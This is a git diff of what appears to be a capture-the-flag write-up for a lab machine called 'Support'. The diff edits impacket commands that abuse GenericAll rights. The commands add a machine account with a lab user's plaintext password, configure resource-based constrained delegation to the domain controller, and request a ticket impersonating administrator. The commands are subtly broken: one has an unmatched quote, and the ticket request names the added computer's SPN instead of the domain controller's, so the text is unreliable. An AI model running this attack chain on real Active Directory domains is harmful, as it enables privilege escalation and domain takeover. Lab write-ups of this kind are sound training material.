@@ -94,11 +94,13 @@ you can  check the bloodhound data and you can see that user `support` is in the
 **impacket**
 since the user has GenericAll enabled, we can add computer to the DC
 add computer
-`impacket-addcomputer -method SAMR -computer-name 'BUSHIT' -computer-pass 'YAWAKA' -dc-host 'dc.support.htb' 'support.htb/support:Ironside47pleasure40Watchful'`
+`impacket-addcomputer -method SAMR -computer-name 'YAWA' -computer-pass 'YAWA KA' -dc-host 'dc.support.htb' 'support.htb/support:Ironside47pleasure40Watchful'`
 
-`impacket-rbcd -delegate-from 'BUSHIT$' -delegate-to 'DC$' -action 'write' support.htb/support:Ironside47pleasure40Watchful'   `
+`impacket-rbcd -delegate-from 'YAWA$' -delegate-to 'DC$' -action 'write' support.htb/support:Ironside47pleasure40Watchful'   `
 
-`impacket-getST -spn 'cifs/BUSHIT.support.htb' -impersonate 'administrator' 'support.htb/BUSHIT$:YAWAKA'` 
+`impacket-getST -spn 'cifs/YAWA.support.htb' -impersonate 'administrator' 'support.htb/YAWA$:YAWA KA'` 
+
+
 
 ---
 <h3>QUESTIONS</h3>
